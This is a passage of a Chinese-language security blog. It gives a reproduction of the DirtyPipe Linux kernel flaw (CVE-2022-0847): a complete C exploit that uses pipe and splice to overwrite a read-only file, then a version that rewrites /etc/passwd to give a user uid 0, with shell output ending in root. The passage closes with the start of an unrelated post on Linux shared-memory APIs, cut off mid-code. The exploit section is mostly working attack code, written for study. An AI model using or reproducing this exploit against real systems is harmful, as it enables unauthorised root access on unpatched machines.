class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">        prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">        --offset;</span><br><span class="line">        <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁªìÊûúÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;yhellow&#125;</span><br><span class="line">/ $ ./exp</span><br><span class="line">st.st_size:0xe</span><br><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;pipeeee&#125;</span><br></pre></td></tr></table></figure>
<p>2.‰øÆÊîπ <code>/etc/passwd</code> ‰∏≠Áî®Êà∑ÁöÑ uid ÂíåÁªÑ id Êù•ÂÆûÁé∞ÊèêÊùÉÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">loff_t</span> offset = <span class="number">30</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;test:x:0:0:,,,,,,,,,,,,,,,:/root:/bin/sh&quot;</span>; </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line">        <span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> fd = open(path, O_RDONLY); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">                perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;st.st_size:0x%lx\n&quot;</span>,st.st_size);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">        prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">        --offset;</span><br><span class="line">        <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Âõ†‰∏∫ <code>su</code> ÂëΩ‰ª§ÈúÄË¶Å root ÊùÉÈôêÔºåÊâÄ‰ª•Âú® root Áî®Êà∑‰∏≠ËøõË°åÊµãËØï</li>
<li>ÁªìÊûúÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /etc/passwd </span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/sh</span><br><span class="line">test:x:<span class="number">1000</span>:<span class="number">1000</span>:note:/home/test:/bin/sh</span><br><span class="line">/ # ./<span class="built_in">exp</span></span><br><span class="line">st.st_size:<span class="number">0x47</span></span><br><span class="line">/ <span class="meta"># cat /etc/passwd </span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/sh</span><br><span class="line">test:x:<span class="number">0</span>:<span class="number">0</span>:,,,,,,,,,,,,,,,:/root:/bin/sh</span><br><span class="line">/ <span class="meta"># su test</span></span><br><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br><span class="line">/ <span class="meta"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span> groups=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ÂàáÊç¢Âà∞ test Áî®Êà∑‰ª•ÂêéÔºåËøòÊòØÊòæÁ§∫ root ÊùÉÈôê</li>
</ul>
<p>ÂèÇËÄÉÔºö</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/void_zk/article/details/125884637?app_version=5.8.1&amp;code=app_1562916241&amp;csdn_share_tail={&quot;type&quot;%3A&quot;blog&quot;%2C&quot;rType&quot;%3A&quot;article&quot;%2C&quot;rId&quot;%3A&quot;125884637&quot;%2C&quot;source&quot;%3A&quot;m0_67072125&quot;}&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app">DirtyPipe(CVE-2022-0847) ËÑèÁÆ°ÊºèÊ¥ûÂ§çÁé∞ÂàÜÊûê</a> </li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/480663969#:~:text=ÈÄöËøáÊ≥®ÂÖ•PIPE_BUF_FLAG_CAN_MERGEÊ†áËÆ∞Âà∞È°µÈù¢ÁºìÂ≠òÔºåÂΩìÊñ∞Êï∞ÊçÆÂÜôÂÖ•Âà∞‰ª•ÁâπÊÆäÊñπÂºèÂàùÂßãÂåñÁöÑÁÆ°ÈÅì‰∏≠Êó∂Â∞ÜÂèØ‰ª•Ë¶ÜÁõñÈ°µÈù¢ÁºìÂ≠ò‰∏≠ÁöÑÊï∞ÊçÆ„ÄÇ,3x Âà©Áî®">CVE-2022-0847ÊºèÊ¥ûÂØπÂÆπÂô®ÁéØÂ¢ÉÂΩ±ÂìçÁöÑÊ∑±Â∫¶ÂàÜÊûê</a> </li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/23/Linux%20%E5%90%84%E7%A7%8D%E5%86%85%E5%AD%98%E5%85%B1%E4%BA%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/23/Linux%20%E5%90%84%E7%A7%8D%E5%86%85%E5%AD%98%E5%85%B1%E4%BA%AB/" class="post-title-link" itemprop="url">Linux ÂêÑÁßçÂÜÖÂ≠òÂÖ±‰∫´</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-23 23:22:17 / Modified: 23:23:30" itemprop="dateCreated datePublished" datetime="2022-11-23T23:22:17+08:00">2022-11-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>SYStemV ÂÖ±‰∫´ÂÜÖÂ≠ò</strong></p>
<p>‰º†ÁªüÁöÑ SYStemV ÂÖ±‰∫´ÂÜÖÂ≠òÊòØÊåá <code>shm</code> ÈÇ£‰∏Ä‰ºô APIÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> size, <span class="keyword">int</span> shmflg)</span></span>; <span class="comment">/* Ëé∑Âèñ‰∏Ä‰∏™Êñ∞ÁöÑÂÖ±‰∫´ÂÜÖÂ≠òÊÆµ */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">shmat</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">const</span> <span class="keyword">void</span> *shmaddr, <span class="keyword">int</span> shmflg)</span></span>; <span class="comment">/* ËøõË°åÂÜÖÂ≠òÊò†Â∞Ñ */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmdt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *shmaddr)</span></span>; <span class="comment">/* Âà†Èô§ÂÜÖÂ≠òÊò†Â∞Ñ */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">int</span> cmd, struct shmid_ds *buf)</span></span>; <span class="comment">/* ÂØπÂÖ±‰∫´ÂÜÖÂ≠òÊÆµËøõË°åÊìç‰Ωú */</span></span><br></pre></td></tr></table></figure>
<p>Âú®Êó©ÊúüÁâàÊú¨ÁöÑÂÜÖÊ†∏‰∏≠Ôºå‚ÄúÂÖ±‰∫´ÂÜÖÂ≠ò‚ÄùÔºå‚Äú‰ø°Âè∑Èáè‚ÄùÔºå‚ÄúÊ∂àÊÅØÈòüÂàó‚Äù ÈÉΩ‰ΩøÁî®ÈÄöÁî®ÁöÑ <code>ipcget</code> ÂáΩÊï∞ÂÆåÊàêÂàõÂª∫ÔºåÂè™ÊòØ <code>ipc_ops</code> ÁªìÊûÑ‰ΩìÁöÑÂàùÂßãÂåñ‰∏çÂêå</p>
<p>ÂÖ∂ÂÆû <code>do_shmat</code> Â∫ïÂ±ÇÁî≥ËØ∑ÂÜÖÂ≠òÁöÑÈÉ®ÂàÜÂíå <code>mmap</code> ‰∏ÄÊ†∑ÔºåÈÉΩÊòØË∞ÉÁî® <code>do_mmap_pgoff</code>ÔºåÊïàÊûúÂ∞±ÊòØÊò†Â∞Ñ‰∏ÄÁâáÁî± VMA ÁªÑÁªáËµ∑Êù•ÁöÑÂÖ±‰∫´ÂÜÖÂ≠òÊÆµ</p>
<p>‰πãÂêéÁöÑ <code>shmget</code> ÈÄöËøáÁõ∏ÂêåÁöÑ <code>key</code>ÔºåÂ∞±ÂèØ‰ª•Ëé∑ÂèñÂêå‰∏ÄÁâáÂÖ±‰∫´ÂÜÖÂ≠òÂå∫Âüü</p>
<p><strong>POSIX ÂÖ±‰∫´ÂÜÖÂ≠ò</strong></p>
<p>‰º†ÁªüÁöÑ SYStemV shm ÂÖ±‰∫´ÂÜÖÂ≠òÊúâ‰∏™ÂçáÁ∫ßÁâàÁöÑ POSIX APIÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shm_open</span><span class="params">(struct vm_area_struct *vma)</span></span>; <span class="comment">/* Âú®/dev/shm/‰∏ãÂª∫Á´ã‰∏Ä‰∏™Êñá‰ª∂,‰Ωú‰∏∫ËØ•ËøõÁ®ãÁöÑÂÖ±‰∫´ÂÜÖÂ≠ò */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shm_close</span><span class="params">(struct vm_area_struct *vma)</span></span>; <span class="comment">/* ÈáäÊîæÁõÆÊ†áÂÖ±‰∫´ÂÜÖÂ≠ò */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shm_destroy</span><span class="params">(struct ipc_namespace *ns, struct shmid_kernel *shp)</span></span>; <span class="comment">/* ÈîÄÊØÅ/dev/shm/‰∏≠ÂØπÂ∫îÁöÑÊñá‰ª∂ */</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>/dev/shm/</code> ÊòØ‰∏Ä‰∏™‰ΩøÁî®Â∞±ÊòØ tmpfs Êñá‰ª∂Á≥ªÁªüÁöÑËÆæÂ§áÔºåÂèØ‰ª•ÁêÜËß£‰∏∫Âè™Â≠òÂú®‰∫éÂÜÖÂ≠ò‰∏äÁöÑÊñá‰ª∂</li>
</ul>
<p>ËøòÊúâ‰∏™Êõ¥ÁªèÂÖ∏ÁöÑ POSIX API Â∞±ÊòØ mmapÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>mmap ÈúÄË¶ÅÂíåÁ£ÅÁõòËøõË°å‰∫§‰∫íÔºàÈùûÂåøÂêçÊò†Â∞ÑÔºâÔºåÂØºËá¥ÊïàÁéáÊ≤°Êúâ shm Â•ΩÔºå‰ΩÜÂÆÉËÉΩÂ§üÂ≠òÂÇ®ÁöÑÁ©∫Èó¥Êõ¥Â§ß</li>
</ul>
<p><strong>memfd_create ÂÖ±‰∫´ÂÜÖÂ≠ò</strong></p>
<p>ÂáΩÊï∞ <code>memfd_create</code> ÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™‚ÄúËôöÊãüÊñá‰ª∂‚ÄùÔºåÂÆÉÊò†Â∞ÑÂà∞‰∏ÄÁâáÁâ©ÁêÜÂÜÖÂ≠òËÄå‰∏çÊòØÁ£ÅÁõò</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memfd_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂàõÂª∫Âü∫‰∫é <code>tmpfs</code> ÁöÑÂåøÂêçÊñá‰ª∂ÔºàËøîÂõûÊñá‰ª∂ÊèèËø∞Á¨¶Ôºâ</li>
</ul>
<p>ÂáΩÊï∞ <code>memfd_create</code> Êú¨Ë∫´Âπ∂Ê≤°ÊúâÂÖ±‰∫´ÂÜÖÂ≠òÁöÑËÉΩÂäõÔºå‰ΩÜÊòØÈÄöËøá‰πãÂâçÁöÑ FD ËΩ¨ÁßªÊäÄÊúØÂèØ‰ª•ÂÆûÁé∞ÂÖ±‰∫´ÂÜÖÂ≠òÔºàÊää <code>memfd_create</code> ÁîüÊàêÁöÑ FD ËΩ¨ÁßªÂà∞ÂÖ∂‰ªñËøõÁ®ã‰∏≠ÔºåÂ∞±ÂÆûÁé∞ÂÖ±‰∫´ÂÜÖÂ≠ò‰∫ÜÔºâ</p>
<p>‰ΩøÁî®Ê°à‰æãÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>ÂèëÈÄÅÂÖ±‰∫´ÂÜÖÂ≠òÂè•ÊüÑÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/memfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> handle_error(msg) do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">send_fd</span><span class="params">(<span class="keyword">int</span> socket, <span class="keyword">int</span> *fd, 